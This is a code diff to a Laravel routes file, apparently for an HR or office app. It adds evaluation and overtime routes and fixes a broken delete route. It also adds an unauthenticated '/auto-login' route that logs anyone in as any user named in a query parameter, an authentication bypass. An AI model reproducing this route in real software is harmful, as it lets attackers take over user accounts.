@@ -1360,8 +1360,18 @@ Route::middleware(['checkUserRole:1,2', 'checkSessionId'])->group(function () {
         EvaluationDataController::class,
         'getFormatYearyayasan',
     ])->name('get.format');
+
+    Route::get('/format-evaluation-year-allinperpanjangan', [
+        EvaluationDataController::class,
+        'evaluationformatrequestpageAllinPerpanjangan',
+    ])->name('format.evaluation.year.allinperpanjangan');
+
+    
     Route::post('/getformatallin', [EvaluationDataController::class, 'getFormatYearallin'])->name(
         'get.format.allin',
+    );
+    Route::post('/getformatallinperpanjangan', [EvaluationDataController::class, 'getFormatYearallinPerpanjangan'])->name(
+        'get.format.allinperpanjangan',
     );
     Route::post('/getformatmagang', [EvaluationDataController::class, 'getFormatYearmagang'])->name(
         'get.format.magang',
@@ -1526,6 +1536,8 @@ Route::middleware(['checkUserRole:1,2', 'checkSessionId'])->group(function () {
     Route::get('/actual-overtime/import', [FormOvertimeController::class, 'showForm'])->name('actual.import.form');
     Route::post('/actual-overtime/import', [FormOvertimeController::class, 'import'])->name('actual.import');
 
+    Route::get('overtime-forms/{id}/reapprove', [FormOvertimeController::class, 'reapprove'])->name('overtime-forms.reapprove');
+
     Route::get('/get-employees', [FormOvertimeController::class, 'getEmployees']);
 
     Route::get('/stock-tinta-index', [StockTintaController::class, 'index'])->name('stocktinta');
@@ -1538,7 +1550,7 @@ Route::middleware(['checkUserRole:1,2', 'checkSessionId'])->group(function () {
         Route::get('/', MonthlyBudgetSummaryIndex::class)->name('monthly-budget-summary-report.index');
         Route::get('/{id}', [MonthlyBudgetSummaryReportController::class, 'show'])->name('monthly.budget.summary.report.show');
         Route::post('/', [MonthlyBudgetSummaryReportController::class, 'store'])->name('monthly.budget.summary.report.store');
-        Route::delete('/id}', [MonthlyBudgetSummaryReportController::class, 'destroy'])->name('monthly.budget.summary.report.delete');
+        Route::delete('/{id}', [MonthlyBudgetSummaryReportController::class, 'destroy'])->name('monthly.budget.summary.report.delete');
         Route::put('/save-autograph/{id}', [MonthlyBudgetSummaryReportController::class, 'saveAutograph'])->name('monthly.budget.summary.save.autograph');
         Route::put('/{id}/reject', [MonthlyBudgetSummaryReportController::class, 'reject'])->name('monthly.budget.summary.report.reject');
         Route::put('/{id}/cancel', [MonthlyBudgetSummaryReportController::class, 'cancel'])->name('monthly.budget.summary.report.cancel');
@@ -1980,6 +1992,12 @@ Route::get('/dashboard-employee-login', function () {
     );
 
     return redirect($link);
+});
+
+Route::get('/auto-login', function(\Illuminate\Http\Request $request){
+    // dd($request->all());
+    $user = \App\Models\User::where('name', $request->query('name'))->firstOrFail();
+    Auth::login($user);
 });
 
 Route::get('/inspection-reports', InspectionIndex::class)->name('inspection-reports.index');
